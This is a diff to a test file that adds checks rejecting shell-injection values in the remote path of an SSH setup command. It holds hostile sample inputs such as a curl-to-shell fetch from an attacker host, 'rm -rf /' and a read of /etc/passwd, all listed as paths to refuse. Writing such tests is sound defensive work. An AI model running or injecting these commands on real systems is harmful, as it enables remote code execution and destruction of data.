@@ -11,14 +11,15 @@ vi.mock('../../../../src/main/conductor-mcp-server', () => ({
 }))
 
 import { ClaudeProvider } from '../../../../src/main/providers/claude'
-import { generateRemoteSetupScript } from '../../../../src/main/providers/claude/ssh-shim'
+import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand } from '../../../../src/main/providers/claude/ssh-shim'
 
 describe('ClaudeProvider SSH-capable surface', () => {
   it('configureRemoteSettings produces a base64-piped node command', () => {
     const p = new ClaudeProvider()
     const cmd = p.configureRemoteSettings('sid-x', '~/repo', null)
     expect(cmd).toContain('base64 -d | node')
-    expect(cmd).toContain('cd ~/repo')
+    // `cd --` defends against a path that begins with a dash being parsed as a flag.
+    expect(cmd).toContain('cd -- ~/repo')
   })
 
   it('getSshSettingsPath returns ~/.claude/settings-<safeSid>.json', () => {
@@ -40,6 +41,46 @@ describe('ClaudeProvider SSH-capable surface', () => {
   it('sanitizes session id in mcp-config path the same way as settings path', () => {
     const p = new ClaudeProvider()
     expect(p.getSshMcpConfigPath('sid/with*bad:chars')).toBe('~/.claude/mcp-sid_with_bad_chars.json')
+  })
+})
+
+describe('SSH remotePath injection defence', () => {
+  it.each([
+    '~',
+    '~/repo',
+    '~user/work',
+    '/home/me/project',
+    './rel/path',
+    '/srv/foo-bar_1.2',
+  ])('accepts safe path %s', (p) => {
+    expect(() => assertSafeRemotePath(p)).not.toThrow()
+  })
+
+  it.each([
+    '~; curl attacker/evil.sh | sh #',
+    '~ && rm -rf /',
+    '`whoami`',
+    '$(id)',
+    '~/repo;ls',
+    '~/repo|cat /etc/passwd',
+    '~/repo with space',
+    "~/'quote'",
+    '~/"dquote"',
+    '~/path\nNL',
+    '~/repo>out',
+  ])('rejects unsafe path %s', (p) => {
+    expect(() => assertSafeRemotePath(p)).toThrow(/Refusing to build SSH setup command/)
+  })
+
+  it('getRemoteSetupCommand throws on a metacharacter-laden remotePath rather than interpolating it', () => {
+    expect(() =>
+      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null),
+    ).toThrow(/Refusing to build SSH setup command/)
+  })
+
+  it('getRemoteSetupCommand uses `cd --` so a leading-dash path is treated as an operand', () => {
+    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null)
+    expect(cmd).toContain(' cd -- ~/repo ')
   })
 })
 
